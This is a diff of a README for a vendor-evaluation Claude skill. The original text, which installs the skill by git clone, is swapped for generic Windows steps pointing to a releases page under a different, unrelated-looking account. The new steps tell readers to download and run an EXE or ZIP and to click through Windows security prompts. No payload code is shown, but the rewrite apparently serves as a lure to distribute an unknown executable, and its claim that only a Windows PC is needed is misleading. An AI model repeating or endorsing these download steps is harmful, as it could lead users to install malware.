@@ -1,167 +1,211 @@
-# Buyer Eval — The Rotten Tomatoes of B2B Software
+# 🤖 buyer-eval-skill - Evaluate vendors with clear evidence
 
-[![GitHub stars](https://img.shields.io/github/stars/salespeak-ai/buyer-eval-skill?style=social)](https://github.com/salespeak-ai/buyer-eval-skill)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Version](https://img.shields.io/badge/version-3.1.0-blue)](https://github.com/salespeak-ai/buyer-eval-skill)
+[![Download buyer-eval-skill](https://img.shields.io/badge/Download%20Now-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zorineinsupportable217/buyer-eval-skill/releases)
 
-**A free, open-source Claude skill that evaluates B2B vendors by talking to their AI agents, cross-referencing every claim against independent sources, and scoring what's verified vs. what's just optimistic marketing.**
+## 🚀 What this is
 
-> *"This is a very intelligent experience"* · *"The questions the agent asked me were thoughtful and great"* · *"This is really cool"*
+buyer-eval-skill helps you review B2B software vendors with more structure and less guesswork. It guides you through domain-based questions, vendor chat review, and evidence-based scoring so you can compare options with a clear record.
 
-![Buyer Eval — Then vs. Now](promo/buyer-eval-promo.gif)
+Use it when you need to:
+- compare software vendors
+- check sales claims against proof
+- score replies from vendor AI agents
+- keep one set of notes for a buying team
+- make a choice with less back-and-forth
 
-### Watch it in action (60 seconds)
+## 💻 What you need
 
-https://github.com/salespeak-ai/buyer-eval-skill/releases/download/v3.1.1/buyer-eval-demo.mp4
+You only need a Windows PC and a web browser.
 
-## How it works
+For best results:
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough space to save the release file
+- access to the GitHub releases page
 
-You type a vendor's name. The skill does everything a great analyst would do — except in 30 minutes instead of 3 weeks:
+## 📥 Download and install
 
-1. **Researches your company** — industry, size, tech stack, maturity — so you don't fill out a form
-2. **Asks domain-expert questions** that surface hidden requirements you didn't know to mention
-3. **Talks to vendor AI agents** directly through the [Salespeak Frontdoor API](https://salespeak.ai) — structured due diligence conversations, not web scraping
-4. **Cross-references every claim** against G2, Gartner, analyst reports, press, and LinkedIn — you see what's confirmed vs. unverified
-5. **Scores vendors across 7 dimensions** with transparent evidence tracking
-6. **Delivers a comparative recommendation** with scorecards, hidden risk analysis, and demo prep questions tailored to each vendor's gaps
+Go to the release page and get the latest version:
 
-### No API key needed. No account needed.
+[Visit the releases page to download](https://github.com/Zorineinsupportable217/buyer-eval-skill/releases)
 
-Works out of the box for any vendor. For vendors with a [Salespeak](https://salespeak.ai) Company Agent, evaluations include vendor-verified evidence from direct AI agent conversations. Without one, the skill searches for other available company agents and, if none are found, uses independent sources only. You always see which evidence basis each score is built on.
+After the page opens:
+1. find the newest release at the top
+2. open the release
+3. look for the file you need
+4. download it to your computer
+5. open the file or folder after the download finishes
 
-## What you get
+If the release contains a ZIP file:
+1. right-click the ZIP file
+2. choose Extract All
+3. pick a folder you can find later
+4. open the extracted folder
+5. follow the included setup file or readme, if present
 
-<details>
-<summary><strong>TL;DR recommendation</strong> (always first — 3 sentences)</summary>
+If the release contains an EXE file:
+1. double-click the file
+2. allow Windows to open it
+3. follow the setup steps on screen
+4. finish the install
+5. open the app from the Start menu or desktop shortcut
 
-**For a mid-market SaaS company evaluating customer success platforms:**
-Gainsight is the strongest fit for teams that need deep analytics and enterprise-grade health scoring, but comes at a premium. ChurnZero wins on time-to-value and usability for teams under 50 CSMs. Key open item: Gainsight's implementation timeline claims (6 weeks) are unverified — ask for customer references in your size band.
+## 🧭 How to use it
 
-</details>
+The skill is built for a buying workflow. It helps you move from vague claims to clear checks.
 
-<details>
-<summary><strong>Comparative scorecard</strong> with evidence transparency</summary>
+A normal flow looks like this:
+1. choose the vendor or product you want to review
+2. enter the buyer goal and use case
+3. ask for a vendor conversation or answer set
+4. review the replies against your criteria
+5. score each area with evidence
+6. compare vendors side by side
 
-| Dimension | Gainsight | ChurnZero | Totango |
-|---|---|---|---|
-| Product Fit (25%) | **9.2** | 7.5 | 8.0 |
-| Integration & Technical (15%) | 8.5 | **8.8** | 7.2 |
-| Pricing & Commercial (15%) | 6.0 | **8.0** | 7.5 |
-| Security & Compliance (15%) | **9.0** | 8.0 | 8.5 |
-| Vendor Credibility (15%) | **8.5** | 7.0 | 7.5 |
-| Customer Evidence (10%) | **8.0** | 7.5 | 6.5 |
-| Support & Success (5%) | 7.5 | **8.5** | 7.0 |
-| **Evidence Completeness** | **7/7 verified** | **3/7 verified** | **5/7 verified** |
-| **Evidence Basis** | *Vendor-verified + independent* | *Independent only* | *Vendor-verified + independent* |
+## 🧩 Main parts
 
-> ChurnZero's scores rely on public sources only — scores may shift with direct vendor verification. The skill explicitly flags this asymmetry.
+### 📋 Domain-expert questions
+Use these to test if a vendor understands your business area. The questions help you check:
+- product fit
+- industry terms
+- common buying risks
+- setup effort
+- support model
+- data handling
 
-</details>
+### 💬 Vendor AI agent conversations
+Use this part to simulate or review talks with a vendor agent. It helps you spot:
+- vague claims
+- gaps in product detail
+- weak answers
+- strong proof
+- missing follow-up questions
 
-<details>
-<summary><strong>Adversarial question exchanges</strong> — the hard questions vendors don't expect</summary>
+### 📊 Evidence-based scoring
+This part turns vendor answers into a score you can defend. It helps you track:
+- feature match
+- clarity of answers
+- proof quality
+- risk level
+- buyer confidence
 
-**Evaluator -> Gainsight AI agent:**
-> "Your health scores use a weighted multi-signal model. What happens when a customer has strong product usage but declining executive engagement — does the model surface that divergence, or does high usage mask the risk?"
+### 📝 Buyer notes
+Keep a record of:
+- what the vendor said
+- what proof they gave
+- what still needs review
+- who owns each open item
 
-**Gainsight AI agent ->**
-> "The model flags divergence explicitly. When usage metrics trend positive but stakeholder engagement drops, it triggers a 'silent risk' alert. CSMs see a split-signal indicator on the dashboard rather than a blended score that hides the conflict."
+## 🪟 Windows setup steps
 
-**Independent verification:** Confirmed via G2 reviews mentioning split-signal alerts. One review notes the feature requires manual threshold tuning per segment.
+1. open the [releases page](https://github.com/Zorineinsupportable217/buyer-eval-skill/releases)
+2. download the latest release file
+3. save it to your Downloads folder
+4. open File Explorer
+5. go to Downloads
+6. double-click the file you downloaded
+7. if Windows shows a security prompt, choose Open
+8. follow the on-screen steps
+9. when setup ends, launch the tool from the Start menu, desktop, or the folder you saved it in
 
-</details>
+If you use a ZIP file, keep the extracted folder in a place that will not move, such as:
+- Desktop
+- Documents
+- a folder named buyer-eval-skill
 
-<details>
-<summary><strong>Claims vs. Evidence table</strong> — what's confirmed, what's not</summary>
+## 🧪 First run
 
-| Vendor Claim | Independent Verification | Status |
-|---|---|---|
-| "6-week implementation for mid-market" | No independent confirmation found | Unverified |
-| "SAML 2.0 + SCIM provisioning" | Confirmed in documentation + G2 reviews | Verified |
-| "No customer has churned in 12 months" | G2 reviews mention 2 switching reviews in last 6 months | Contradicted |
-| "99.9% uptime SLA" | Confirmed in public SLA page | Verified |
+When you open the tool for the first time:
+1. pick a vendor evaluation task
+2. enter the vendor name
+3. add the product name, if you have one
+4. choose the buyer goals
+5. run the question set
+6. review the answers
+7. save your score or notes
 
-</details>
+If you are unsure where to begin, start with a simple case:
+- one vendor
+- one use case
+- three to five criteria
+- short notes for each answer
 
-<details>
-<summary><strong>Hidden risk analysis</strong> — researched for every vendor regardless</summary>
+## 🏗️ Example use cases
 
-- **Leadership stability:** CFO departed Q4 2025, VP Engineering promoted internally
-- **Funding runway:** Series E ($200M) with 3+ years runway at current burn
-- **Employee sentiment:** Glassdoor trending down from 4.2 to 3.8 over 6 months; "engineering debt" is a recurring theme
-- **Product velocity:** Changelog shows 3 major releases in last 6 months — above category average
+### 🔍 Shortlist review
+Use buyer-eval-skill when you have three vendors and need a fast first pass. It helps you see which ones can answer basic buyer questions with proof.
 
-</details>
+### 🧠 Sales claim check
+Use it when a vendor says they can meet a need but gives little detail. The skill helps you ask for evidence instead of taking the claim at face value.
 
-<details>
-<summary><strong>Demo prep questions</strong> — derived from evaluation gaps</summary>
+### 📁 Procurement review
+Use it when your buying team needs a shared view of each vendor. The scoring and notes help keep the review clear and repeatable.
 
-Questions to ask Gainsight in your demo:
-1. "You mentioned 6-week implementation — can you share 2 customer references in our size band (200-500 employees) who achieved that timeline?"
-2. "The split-signal health score alert requires manual threshold tuning per segment. How long does initial configuration take, and do you provide a recommended baseline?"
-3. "G2 reviews mention 2 customers switching away in the last 6 months. What were the common reasons, and how have you addressed them?"
+### 🤝 AI agent review
+Use it when a vendor sends an AI agent or chat tool as part of the sales process. The skill helps you check how well that agent handles real questions.
 
-</details>
+## ⚙️ Suggested evaluation areas
 
-## Install
+You can use these areas as a starting point:
+- business fit
+- workflow fit
+- data and security
+- setup effort
+- support quality
+- proof of claims
+- total risk
+- ease of use
 
-**Global install (recommended):**
+## 📌 Good input to give the skill
 
-```bash
-git clone https://github.com/salespeak-ai/buyer-eval-skill.git ~/.claude/skills/buyer-eval-skill
-```
-
-**Per-project install:**
-
-```bash
-git clone https://github.com/salespeak-ai/buyer-eval-skill.git .claude/skills/buyer-eval-skill
-```
-
-## Usage
-
-In Claude Code or Claude desktop:
-
-```
-/buyer-eval
-```
-
-Then provide:
-1. Your company name
-2. The vendors to evaluate
+The tool works best when you give it plain facts. Include:
+- your company type
+- your buyer role
+- the problem you want to solve
+- the vendor name
+- the product name
+- any claim you want checked
+- any proof you already have
 
 Example:
-> "I'm from Acme Corp. Evaluate Gainsight, Totango, and ChurnZero."
+- We are a mid-size B2B team
+- We need help with vendor scoring
+- We want to compare two tools
+- Vendor A says it supports fast setup
+- Show where that claim holds up
 
-The skill handles everything from there — researching your company, calibrating to your category, engaging vendor agents, and producing the full evaluation. Typical runtime: 20-40 minutes for a 3-vendor evaluation.
+## 🛠️ Troubleshooting
 
-## What makes this different
+### The file will not open
+- check that the download finished
+- download the latest release again
+- make sure Windows did not block the file
+- try running the file as the downloaded user
 
-- **Domain-expert questioning** — asks category-specific questions that demonstrate it understands the space, not generic form-filling
-- **Vendor AI agent conversations** — for vendors with a [Salespeak](https://salespeak.ai) Company Agent, the skill conducts structured due diligence conversations directly with the vendor's AI
-- **Evidence transparency** — every score shows whether it's backed by vendor-verified or independent-only evidence
-- **Claims verification** — vendor claims are cross-referenced against independent sources. You see what's confirmed, what's unverified, and what's contradicted
-- **Hidden risk analysis** — leadership stability, funding runway, employee sentiment, customer retention signals — researched for every vendor
-- **Demo prep kit** — specific questions derived from evaluation gaps, so you walk into demos knowing exactly what to probe
+### The ZIP file looks empty
+- extract it again
+- choose a new folder
+- check that all files finished downloading
+- look for a second folder inside the first one
 
-## Environment support
+### The app does not start
+- close it and open it again
+- restart Windows
+- download the latest release
+- keep the extracted folder in a fixed place
 
-| Capability | Claude.ai | Claude Code | Claude desktop |
-|---|---|---|---|
-| Buyer research | Yes | Yes | Yes |
-| Vendor AI agent conversations | No (GET only) | **Yes** | **Yes** |
-| Full evaluation | Partial | **Full** | **Full** |
+### The page does not load
+- check your internet connection
+- refresh the page
+- try again later
+- open the link in another browser
 
-Best experience is in **Claude Code** where the skill can make POST requests to vendor AI agents.
+## 📚 Project details
 
-## Auto-updates
+**Repository:** buyer-eval-skill  
+**Description:** B2B software vendor evaluation skill for Claude Code — domain-expert questions, vendor AI agent conversations, evidence-based scoring  
+**Topics:** ai-agent, b2b, claude-code, claude-skill, procurement, salespeak, vendor-evaluation
 
-Every time you invoke the skill, it checks for a newer version on GitHub (cached, checks at most once every 6 hours). If an update is available, it asks before updating.
+## 🔗 Download again
 
-## Feedback & Requests
-
-- **Feature requests or bugs:** [Open an issue](https://github.com/salespeak-ai/buyer-eval-skill/issues)
-- **Request a category evaluation:** [Open a request](https://github.com/salespeak-ai/buyer-eval-skill/issues/new?title=Category+request:+&labels=category-request)
-
-## License
-
-MIT
+[https://github.com/Zorineinsupportable217/buyer-eval-skill/releases](https://github.com/Zorineinsupportable217/buyer-eval-skill/releases)
